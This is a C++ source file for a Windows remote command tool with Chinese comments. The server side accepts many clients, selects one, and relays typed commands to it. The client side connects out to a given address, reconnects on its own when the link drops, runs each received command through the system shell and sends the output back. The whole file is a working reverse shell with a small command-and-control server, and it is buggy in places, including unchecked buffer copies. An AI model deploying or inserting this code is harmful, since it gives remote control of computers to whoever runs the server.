#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#include <winsock2.h>
#include <ws2tcpip.h>
#include <vector>
#include <thread>
#include <iostream>
#include <algorithm>
#include <direct.h>
#pragma comment(lib, "ws2_32.lib")
#define MAX_BUFFER_SIZE 1024
#define BUFFER_SIZE 1024
#define NICKNAME_LEN 1024
#define ERROR_EXIT(msg) {perror(msg); exit(EXIT_FAILURE);}
#define History_SIZE 4096
char History[History_SIZE];
char Cli_num[25];
int Control_Server_port = 0;
SOCKET sclient;//控制端描述符
int selected = 0;//选择
int History_selected = 0; //历史连接数量
struct _Client
{
    SOCKET s = INVALID_SOCKET;
    int num = 0;
    char name[1024];
    char time[24];//[2024/12/25 12:10:34:345] 23+1
};
_Client _client_;
std::vector<_Client> clients; // 客户端套接字列表

struct tm* sysTime_t = NULL;
void Now_TIME(time_t now) {
    sysTime_t = localtime(&now);
}

//粘包处理接收
int RECV(SOCKET sock, char* data) {
    int recvLen;
    int _recv = recv(sock, (char*)&recvLen, sizeof(int), 0);
    if (_recv <= 0) return _recv;
    if (recvLen > 1024) return 1024;
    _recv = recv(sock, data, recvLen, 0);
    if (_recv == recvLen) return 1;
    return _recv;
}
//接收控制端接口
void Control_Server()
{
    WORD sockVersion = MAKEWORD(2, 2);//请求使用的winsock版本 
    WSADATA wsaData;   // 实际返回的winsock版本  
    //创建socket 
    SOCKET slisten = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);//参数分别为协议族，类型，协议号 AF_INET代表TCP/IP 
    if (slisten == INVALID_SOCKET) {//异常处理 
        printf("scoket error!");
        return;
    }
    //bind
    sockaddr_in sin; //服务器端点地址 
    sin.sin_family = AF_INET; //协议族
    sin.sin_port = htons(Control_Server_port); //端口号， htons函数将本地字节顺序变为网络字节顺序（16位） 
    sin.sin_addr.S_un.S_addr = INADDR_ANY;//服务器bind时需要使用地址通配
    if (bind(slisten, (LPSOCKADDR)&sin, sizeof(sin)) == SOCKET_ERROR) { //LPSOCKADDR是类型强制转换
        printf("bind error !");
    }
    char* com = new char[1024];
    char buffer[BUFFER_SIZE];
    int Last_selected = 0;
    char title[NICKNAME_LEN];
    int ret = 1;
    int H_Control_Server_port = Control_Server_port;
    while (1) {
        Control_Server_port = H_Control_Server_port;
        if (listen(slisten, 5) == SOCKET_ERROR) { //5为queuesize,缓存区大小
            printf("listen error !");
            return;
        }
        //由于使用的是TCP ，socket stream,要循环接收数据
        sockaddr_in remoteAddr;
        int nAddrlen = sizeof(remoteAddr);
        sclient = accept(slisten, (SOCKADDR*)&remoteAddr, &nAddrlen);//accept会新建一个socket 
        if (sclient == INVALID_SOCKET) {
            printf("accept error !");
            return;
        }
        send(sclient, "console", 8, 0);
        ret = 1;
        while (ret > 0) {
            memset(com, '\0', sizeof(com));
            memset(buffer, '\0', sizeof(buffer));
            int ret = RECV(sclient, buffer);
            if (ret > 0) {
                if (strlen(buffer) == 0) continue;
                for (int i = 0; i < strlen(buffer); i++) {
                    if (buffer[i] != ' ') {
                        com[0] = 'B';
                        break;
                    }
                }
                if (com[0] != 'B') continue;
                printf("%s\n", buffer);
            }
            else {
                //控制端断开
                //printf("\n[%d]$ ", selected);
                Control_Server_port = 0;
                break;
            }
            if (strlen(buffer) == 0) {
                printf("[%d]$ ", selected);
                continue;
            }
            if (!strcmp(buffer, "cls")) system("cls");
            if (buffer[0] == '/') {
                int max_length_Cli_name = 0;
                int length_num_max = 0;
                for (size_t i = 0; i < clients.size(); ++i) {
                    if (strlen(clients[i].name) > max_length_Cli_name) max_length_Cli_name = strlen(clients[i].name);
                    if (clients[i].num > length_num_max) length_num_max = clients[i].num;
                }
                int numDigits = 0;
                while (length_num_max != 0) {
                    length_num_max /= 10;
                    ++numDigits;
                }
                length_num_max = numDigits;
                for (size_t i = 0; i < clients.size(); ++i) {
                    printf("#%-2d %*s R%*d [%s]\n", i, -max_length_Cli_name, clients[i].name, -length_num_max, clients[i].num, clients[i].time);
                    memset(com, '\0', sizeof(com));
                    sprintf(com, "#%-2d %*s R%*d [%s]\n", i, -max_length_Cli_name, clients[i].name, -length_num_max, clients[i].num, clients[i].time);
                    send(sclient, com, strlen(com), 0);
                }
                printf("[%d]$ ", selected);
                memset(com, '\0', sizeof(com));
                sprintf(com, "[%d]$ ", selected);
                send(sclient, com, strlen(com), 0);
                continue;
            }
            if (buffer[0] == '#')
            {
                if (buffer[1] == '#') {
                    History[0] = '\0';
                    printf("[%d]$ ", selected);
                    memset(com, '\0', sizeof(com));
                    sprintf(com, "[%d]$ ", selected);
                    send(sclient, com, strlen(com), 0);
                    continue;
                }
                if (buffer[1] == '\0') {  //NULL , '\0' ,0 的ASCII码值都是 0 , '0'是48
                    printf("%s", History);
                    send(sclient, History, strlen(History), 0);
                    printf("[%d]$ ", selected);
                    memset(com, '\0', sizeof(com));
                    sprintf(com, "[%d]$ ", selected);
                    send(sclient, com, strlen(com), 0);
                    continue;
                }
                selected = atoi(buffer + 1);
                printf("[%d]$ ", selected);
                memset(com, '\0', sizeof(com));
                sprintf(com, "[%d]$ ", selected);
                send(sclient, com, strlen(com), 0);
            }
            else {
                if (clients.size() <= selected || (send(clients[selected].s, buffer, sizeof(buffer), 0) <= 0))
                {
                    printf("[%d]$ ", selected);
                    memset(com, '\0', sizeof(com));
                    sprintf(com, "[%d]$ ", selected);
                    send(sclient, com, strlen(com), 0);
                }
            }
        }
    }
    //控制台返回数据
}
//客户端心跳包
void Server_Loop_Send_W()
{
    while (1) {
        Sleep(200000);
        for (size_t i = 0; i < clients.size(); ++i) {
            send(clients[i].s, " ", strlen(" "), 0);
        }
    }
}
// 向指定的客户端发送消息的线程函数
void send_threads()
{
    char buffer[BUFFER_SIZE];
    int Last_selected = 0;
    char title[NICKNAME_LEN];
    char* com = new char[1024];
    printf("$ ");
    while (true)
    {
        memset(buffer, 0, sizeof(buffer));
        gets_s(buffer);
        if (strlen(buffer) == 0) {
            printf("[%d]$ ", selected);
            continue;
        }
        if (!strcmp(buffer, "cls")) system("cls");
        if (buffer[0] == '/') {
            int max_length_Cli_name = 0;
            int length_num_max = 0;
            for (size_t i = 0; i < clients.size(); ++i) {
                if (strlen(clients[i].name) > max_length_Cli_name) max_length_Cli_name = strlen(clients[i].name);
                if (clients[i].num > length_num_max) length_num_max = clients[i].num;
            }
            int numDigits = 0;
            while (length_num_max != 0) {
                length_num_max /= 10;
                ++numDigits;
            }
            length_num_max = numDigits;
            for (size_t i = 0; i < clients.size(); ++i) {
                printf("#%-2d %*s R%*d [%s]\n", i, -max_length_Cli_name, clients[i].name, -length_num_max, clients[i].num, clients[i].time);
            }
            printf("[%d]$ ", selected);
            continue;
        }
        if (buffer[0] == '#')
        {
            if (buffer[1] == '#') {
                History[0] = '\0';
                printf("[%d]$ ", selected);
                continue;
            }
            if (buffer[1] == '\0') {  //NULL , '\0' ,0 的ASCII码值都是 0 , '0'是48
                printf("%s", History);
                printf("[%d]$ ", selected);
                continue;
            }
            selected = atoi(buffer + 1);
            printf("[%d]$ ", selected);
        }
        else {
            if (clients.size() <= selected || (send(clients[selected].s, buffer, sizeof(buffer), 0) <= 0)) {
                printf("[%d]$ ", selected);
            }
            else {
                strcat(buffer, "\n");
                if (Control_Server_port != 0) send(sclient, buffer, strlen(buffer), 0);
            }
        }
    }
}
// 初始化服务器
SOCKET init_server(int port)
{
    WSADATA wsaData;
    int ws = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (ws != 0) return 0;
    SOCKET server = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(port);
    bind(server, (struct sockaddr*)&addr, sizeof(addr));
    listen(server, SOMAXCONN);
    return server;
}
// 初始化客户端
SOCKET init_client(const char* ip, int port)
{
    WSADATA wsaData;
    int ws = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (ws != 0) return 0;
    SOCKET client = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(ip);
    addr.sin_port = htons(port);
    connect(client, (struct sockaddr*)&addr, sizeof(addr));
    return client;
}
// 处理新的连接
void handle_new_connection(SOCKET server)
{
    SOCKET client = accept(server, NULL, NULL);
    char title[NICKNAME_LEN];
    if (client != INVALID_SOCKET)
    {
        memset(_client_.name, 0, sizeof(_client_.name));
        if (recv(client, _client_.name, sizeof(_client_.name), 0) <= 0)
        {
            SetConsoleTitle("RECV NAME ERROR");
            closesocket(client);
            _client_.s = INVALID_SOCKET;
            Sleep(5000);
            return;
        }
        memset(Cli_num, 0, sizeof(Cli_num));
        _itoa(++History_selected, Cli_num, 10);
        send(client, Cli_num, strlen(Cli_num), 0);

        Now_TIME(time(NULL));
        sprintf(title, "%d/%d/%d %d:%d:%d:%d\0", 
            1900 + sysTime_t->tm_year, 1 + sysTime_t->tm_mon, sysTime_t->tm_mday,
            sysTime_t->tm_hour, sysTime_t->tm_min, sysTime_t->tm_sec, (int)(time(NULL) % 1000)
        );
        strcpy(_client_.time, title);
        _client_.s = client;
        _client_.num = History_selected;
        clients.push_back(_client_); // 添加到客户端列表
        sprintf(
            title,
            "#%d %s [R%d] [%s] 已连接",
            clients.size() - 1,
            _client_.name,
            _client_.num,
            _client_.time
        );
        SetConsoleTitle(title);
        if ((strlen(History) + strlen(title) + 2) > History_SIZE) {
            strcpy(History, title);
            strcat(History, "\n\0");
        }
        else {
            strcat(History, title);
            strcat(History, "\n\0");
        }
    }
}
// 处理客户端数据
void handle_client_data(WSAPOLLFD fd)
{
    char buffer[MAX_BUFFER_SIZE + 1];
    memset(buffer, '\0', sizeof(buffer));
    int n = recv(fd.fd, buffer, sizeof(buffer) - 1, 0);
    if (n > 0)
    {
        // TODO: 处理接收到的数据
        if(clients[selected].s == fd.fd) printf("%s", buffer);
        if (Control_Server_port != 0 && clients[selected].s == fd.fd) send(sclient, buffer, strlen(buffer), 0);
    }
    else // 客户端已断开连接
    {
        closesocket(fd.fd);
        // 删除客户端
        printf("删除客户端\n");
        for (int i = 0; i < clients.size(); i++)
        {
            if (clients[i].s == fd.fd)
            {
                clients.erase(clients.begin() + i);
                break;
            }
        }
    }
}
//帮助信息
void HELP(char** argv) {
    printf("Usage: %s [port] server mode\n", argv[0]);
    printf("   or: %s [port] [port] control mode\n", argv[0]);
    printf("   or: %s [ip] [port] [name] client mode\n", argv[0]);
    printf("  and: #[num]: Select user /: Traverse the client\n");
    printf("  and: #: View historical connection\n");
}
//客户端断开
void handle_client_disconnection(pollfd& fd)
{
    // 关闭与客户端的连接
    closesocket(fd.fd);
    // 从fds数组中移除这个客户端的文件描述符
    for (size_t i = 0; i < clients.size(); ++i)
    {
        if (clients[i].s == fd.fd)
        {
            char buffer[BUFFER_SIZE];
            Now_TIME(time(NULL));
            sprintf(
                buffer,
                "#%d %s [R%d] [%d/%d/%d %d:%d:%d:%d] 已断开\0",
                i,
                clients[i].name,
                clients[i].num,
                1900 + sysTime_t->tm_year, 1 + sysTime_t->tm_mon, sysTime_t->tm_mday,
                sysTime_t->tm_hour, sysTime_t->tm_min, sysTime_t->tm_sec, (int)(time(NULL) % 1000)
            );
            SetConsoleTitle(buffer);
            if ((strlen(History) + strlen(buffer) + 2) > History_SIZE) {
                //memset(History, 0, sizeof(History));
                strcpy(History, buffer);
                strcat(History, "\n\0");
            }
            else {
                strcat(History, buffer);
                strcat(History, "\n\0");
            }
            clients.erase(clients.begin() + i);
            break;
        }
    }
    //printf("Client Disconnected, fd=%d\n", fd.fd);
}
//输出当前路径
void printCWD() {
    char Current_path[MAX_PATH];
    char* pwd = _getcwd(Current_path, MAX_PATH);
    printf("[%s]$ ", Current_path);
}
int main(int argc, char* argv[])
{
    if (argc == 1) {//不加参数输出路径
        printCWD();
        return 0;
    }
    if (argc == 2 && (argv[1][2] == 'h' || argv[1][0] < '0' || argv[1][0] > '9')) {
        HELP(argv);
        return 0;
    }
    else if (argc == 2 || argc == 3) // 作为服务器运行
    {
        int port = atoi(argv[1]);

        if (argc == 3) Control_Server_port = atoi(argv[2]);
        SOCKET server = init_server(port);
        std::thread t(send_threads); // 创建发送消息的线程
        std::thread s(Server_Loop_Send_W); // 创建发送消息的线程
        if (Control_Server_port != 0) {
            std::thread c(Control_Server); // 创建发送消息的线程
            c.detach();
        }
        t.detach();
        s.detach();
        while (true)
        {
            std::vector<WSAPOLLFD> fds;
            fds.push_back({ server, POLLIN, 0 });
            for (_Client& client : clients)
            {
                fds.push_back({ client.s, POLLIN, 0 });
            }
            int ret = WSAPoll(fds.data(), fds.size(), -1);
            //printf("RET=%d\n", ret);
            if (ret > 0)
            {
                if (fds[0].revents & POLLIN) // 有新的连接
                {
                    //printf("New Connect\n");
                    handle_new_connection(server);
                }
                for (size_t i = 1; i < fds.size(); ++i) // 检查每个客户端
                {
                    if (fds[i].revents & POLLHUP) // 客户端断开连接
                    {
                        //printf("Client Disconnected\n");
                        handle_client_disconnection(fds[i]);
                    }
                    else if (fds[i].revents & POLLIN) // 客户端有数据可读
                    {
                        //printf("New Msg\n");
                        handle_client_data(fds[i]);
                    }
                }
            }
            else if (ret < 0) {
                std::cout << "poll error" << std::endl;
                break;
            }
            else {
                std::cout << "poll timeout" << std::endl;
                //超时检查客户端有没有断开
                for (int i = 0; i < clients.size(); ++i) {
                    if (clients[i].s == INVALID_SOCKET) {
                        closesocket(clients[i].s);
                        clients.erase(clients.begin() + i);
                    }
                }
            }
            //Sleep(50);
        }
        closesocket(server);
        WSACleanup();
    }
    else if (argc == 4) // 作为客户端运行
    {
        FILE* fp = NULL;
        char buffer[BUFFER_SIZE];
        char com[BUFFER_SIZE];
        char mony[256] = "$ ";
        const char* ip = argv[1];
        int port = atoi(argv[2]);
        if (strlen(argv[3]) > 256) ERROR_EXIT("Parameter 3 Exceeds the length");

        WSADATA wsaData;
        int ws = WSAStartup(MAKEWORD(2, 2), &wsaData);
        if (ws != 0) return 0;
        SOCKET client = socket(AF_INET, SOCK_STREAM, 0);
        sockaddr_in addr;
        while (1) {
            client = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (client == INVALID_SOCKET) {
                printf("invalid socket!");
                return 0;
            }
            addr.sin_family = AF_INET;
            addr.sin_addr.s_addr = inet_addr(argv[1]);
            addr.sin_port = htons(atoi(argv[2]));
            while (connect(client, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) {
                SetConsoleTitle("CONNECT . . . .");
                Sleep(200000);
                continue;
            }
            // TODO: 处理客户端的逻辑
            if (send(client, argv[3], strlen(argv[3]), 0) <= 0) { //发送客户端名字
                ERROR_EXIT("send error");
            }
            memset(buffer, '\0', sizeof(buffer));
            if (recv(client, buffer, sizeof(buffer), 0) <= 0) { // && errno != EINTR
                closesocket(client);
                strcpy(buffer, "[");
                strcat(buffer, strerror(errno));
                strcat(buffer, "] RECV . . . .");
                SetConsoleTitle(buffer);
                Sleep(60000);
                continue;
            }
            else {
                sprintf(com, "R%s %s %s %s", buffer, argv[1], argv[2], argv[3]);
                SetConsoleTitle(com);
                printf("\r                                                         \r$ ");
            }
            while (1)
            {
                memset(buffer, '\0', sizeof(buffer));
                memset(com, '\0', sizeof(com));
                if (recv(client, buffer, sizeof(buffer), 0) <= 0) {
                    closesocket(client);
                    strcpy(buffer, "[");
                    strcat(buffer, strerror(errno));
                    strcat(buffer, "] RECV . . .\0");
                    SetConsoleTitle(buffer);
                    Sleep(5000);
                    break;
                }
                if (strlen(buffer) == 0) continue;
                for (int i = 0; i < strlen(buffer); i++) {
                    if (buffer[i] != ' ') {
                        com[0] = 'B';
                        break;
                    }
                }
                if (com[0] != 'B') continue;
                printf("%s\n", buffer);
                if (!strcmp(buffer, "cls")) {
                    system("cls");
                    strcpy(com, _pgmptr);
                }
                else {
                    strcpy(com, buffer);
                    strcat(com, " 2>&1&echo;&");
                    strcat(com, _pgmptr);
                }
                memset(buffer, '\0', sizeof(buffer));
                fp = _popen(com, "r");
                if (!fp) {
                    perror("popen");
                    exit(EXIT_FAILURE);
                }
                if (!fp) {
                    return 1;
                }
                while (fgets(buffer, sizeof(buffer) - 1, fp) != 0) {
                    printf("%s", buffer);
                    if (send(client, buffer, strlen(buffer), 0) <= 0) ERROR_EXIT("send error");
                }
                buffer[strlen(buffer) - 3] = '\0';
                memcpy(mony, buffer + 1, strlen(buffer) - 1);
                SetCurrentDirectoryA(mony);
                memset(mony, '\0', sizeof(mony));
                _pclose(fp);
            }
        }
    }
    else {
        printCWD();
    }
    return 0;
}